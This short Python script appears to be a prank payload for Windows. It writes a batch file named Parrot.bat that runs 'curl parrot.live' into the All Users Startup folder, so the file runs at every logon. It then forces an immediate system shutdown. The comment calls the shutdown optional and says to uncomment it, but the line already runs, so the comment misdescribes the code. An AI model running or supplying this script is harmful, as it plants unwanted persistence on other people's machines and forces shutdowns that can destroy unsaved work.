import os
import shutil

# Data to be written in the batch file
data = "curl parrot.live"

# Get the path to the All Users Startup folder
all_users_startup = os.path.join(os.getenv('ALLUSERSPROFILE'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

# Create the full path for the Parrot.bat file in the All Users Startup folder
path = os.path.join(all_users_startup, 'Parrot.bat')

# Open the Parrot.bat file in append mode to write the data
with open(path, "a") as f:
    f.write(data)

# Optionally, shutdown the system (uncomment to enable shutdown)
os.system('shutdown /s /f /t 0')
